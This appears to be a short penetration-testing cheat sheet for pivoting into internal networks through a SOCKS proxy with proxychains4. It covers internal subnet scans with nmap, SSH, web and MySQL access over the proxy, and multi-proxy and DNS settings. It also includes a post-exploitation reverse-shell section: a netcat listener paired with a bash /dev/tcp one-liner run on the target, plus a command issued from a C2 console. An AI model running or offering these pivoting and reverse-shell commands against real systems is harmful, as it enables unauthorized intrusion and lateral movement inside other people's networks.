## Nmap via SOCKS
proxychains4 -f proxychains.conf nmap -sV -p 22,3306 10.0.0.0/24

## SSH Through SOCKS
proxychains4 -f proxychains.conf ssh admin@10.0.1.50

## Curl Requests
proxychains4 -f proxychains.conf curl http://10.0.1.100/admin

## Database Access
proxychains4 -f proxychains.conf mysql -h 10.0.2.20 -u dbadmin -p

## Multi-Proxy Failover
# proxychains.conf:
# dynamic_chain
# [ProxyList]
# socks5 127.0.0.1 1080
# socks5 10.0.0.100 1080
# http   proxy.internal:8080

proxychains4 nmap -sV 10.0.0.0/24

## DNS Pivoting
# proxychains.conf: proxy_dns
proxychains4 curl http://fileserver.internal/share

## Reverse Shell via Proxy
proxychains4 nc -nlvp 4444
# On target: bash -i >& /dev/tcp/10.0.0.50/4444 0>&1

## From C2
> shell proxychains4 nmap -sV 10.0.0.0/24

## Round-Robin Load Balancing
# Chain multiple proxies across tool runs

## SSH ProxyCommand Integration
# ~/.ssh/config: ProxyCommand nc -x localhost:1080 %h %p
proxychains4 ssh internal-server
